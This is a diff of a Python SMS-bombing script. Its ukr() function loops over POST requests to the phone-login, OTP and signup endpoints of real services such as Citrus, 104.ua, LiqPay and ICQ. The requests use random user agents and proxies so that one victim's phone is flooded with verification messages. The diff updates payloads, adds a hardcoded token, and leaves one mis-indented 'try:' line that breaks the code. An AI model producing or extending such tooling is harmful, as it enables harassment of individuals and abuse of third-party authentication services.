@@ -72,31 +72,19 @@ def ukr():
         for _ in track(range(run)):
                 headers = {"User-Agent": fake_useragent.UserAgent().random}
                 try:
-                        requests.post("https://my.ctrs.com.ua/api/auth/login", data={"phone": "+" + number}, headers=headers, proxies=proxies)#https://www.citrus.ua/?gclsrc=aw.ds&gclid=CjwKCAiAs92MBhAXEiwAXTi253UnT0-Ws93B3drlp81h97IFAOzTqmkLJLEStUktScA14Vu5Jn8AShoCS-UQAvD_BwE
+                        requests.post("https://my.ctrs.com.ua/api/auth/login", json={"phone": "+" + number}, headers=headers, proxies=proxies)#https://www.citrus.ua/?gclsrc=aw.ds&gclid=CjwKCAiAs92MBhAXEiwAXTi253UnT0-Ws93B3drlp81h97IFAOzTqmkLJLEStUktScA14Vu5Jn8AShoCS-UQAvD_BwE
                 except:
                         pass
                 try:
-                        requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/", data={"phone": "+" + number}, headers=headers, proxies=proxies)#https://www.instagram.com/accounts/password/reset/
+                        requests.post("https://account.104.ua/signup/request/create", data={"phone": number}, headers=headers, proxies=proxies)#https://ok.104.ua/ua/signup?step=2
                 except:
                         pass
                 try:
-                        requests.post("https://account.104.ua/signup/request/create", json={"phone": number}, headers=headers, proxies=proxies)#https://ok.104.ua/ua/signup?step=2
+                        requests.post("https://www.liqpay.ua/apiweb/login/start", data={"phone": number, "token": "lp_91d8dedf4a311ad78604ec6b4e572ded001502bb"}, headers=headers, proxies=proxies)#https://www.liqpay.ua/ru/authorization
                 except:
                         pass
-                try:
-                        requests.post("https://account.kyivstar.ua/cas/auth/otp.rpc", json={"phone": number}, headers=headers, proxies=proxies)#https://account.kyivstar.ua/cas/login?service=https%3A%2F%2Faccount.kyivstar.ua%2Fcas6%2Flogin%3Fclient_name%3DCasClient85
-                except:
-                        pass
-                try:
-                        requests.post("https://www.liqpay.ua/apiweb/login/start", date={"phone": number}, headers=headers, proxies=proxies)#https://www.liqpay.ua/ru/authorization
-                except:
-                        pass
-                try:
-                        requests.post("https://u.icq.net/api/v70/rapi/auth/sendCoden", json={"phone": "+" + number}, headers=headers, proxies=proxies)#https://web.icq.com/
-                except:
-                        pass
-                try:
-                        requests.post("https://eva.ua/graphql", json={"phone": "+" + number}, headers=headers, proxies=proxies)#https://eva.ua/#login
+try:
+                        requests.post("https://u.icq.net/api/v70/rapi/auth/sendCoden", params={"phone": number, "devId": "ic1rtwz1s1Hj1O0r"}, headers=headers, proxies=proxies)#https://web.icq.com/
                 except:
                         pass
 #САйт которий я не понель
@@ -104,6 +92,10 @@ def ukr():
 #https://www.instagram.com/accounts/signup/phone
 #https://www.work.ua/confirm/?fromPage=jobseeker-register
 #https://my.vodafone.ua/auth?language=ua
+#https://www.instagram.com/accounts/password/reset/
+#https://account.kyivstar.ua/cas/login?service=https%3A%2F%2Faccount.kyivstar.ua%2Fcas6%2Flogin%3Fclient_name%3DCasClient85
+#https://vipplay.ru/#auth-code-phone
+#https://eva.ua/#login
 
 def russ():
         for _ in track(range(run)):
